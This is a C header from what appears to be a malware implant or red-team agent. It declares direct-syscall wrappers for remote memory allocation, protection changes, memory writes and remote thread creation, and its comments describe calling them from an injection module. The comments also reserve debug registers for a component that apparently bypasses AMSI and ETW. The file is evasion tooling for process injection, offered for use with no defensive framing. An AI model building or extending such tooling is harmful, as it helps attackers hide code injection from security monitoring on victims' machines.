/*
 * syscall_mask.h — public API for HERO direct-syscall wrappers
 *
 * ISOLATION CONTRACT:
 *   - sm_* functions have ZERO shared state with Shadow7 / PhantomCtx
 *   - No DR register usage (DR0-DR3 reserved for Shadow7/AMSI/ETW)
 *   - Fallback: if sm_is_ready()==0, use normal Win32 API instead
 *
 * USAGE PATTERN in injection.c or any caller:
 *
 *   // At agent startup (after shadow7_init):
 *   sm_init();
 *
 *   // Before using:
 *   if (sm_is_ready()) {
 *       status = sm_NtAllocateVirtualMemory(hProc, &base, 0, &sz,
 *                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 *   } else {
 *       base = VirtualAllocEx(hProc, NULL, sz,
 *                  MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 *   }
 *
 *   // At agent shutdown:
 *   sm_cleanup();
 */
#ifndef SYSCALL_MASK_H
#define SYSCALL_MASK_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Lifecycle */
int  sm_init(void);      /* call once at startup — returns 1=ready 0=fallback */
int  sm_is_ready(void);  /* check before every use */
void sm_cleanup(void);   /* call on agent shutdown */

/* The 4 high-risk syscall wrappers */
NTSTATUS sm_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

NTSTATUS sm_NtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect);

NTSTATUS sm_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

NTSTATUS sm_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList);

#ifdef __cplusplus
}
#endif
#endif /* SYSCALL_MASK_H */
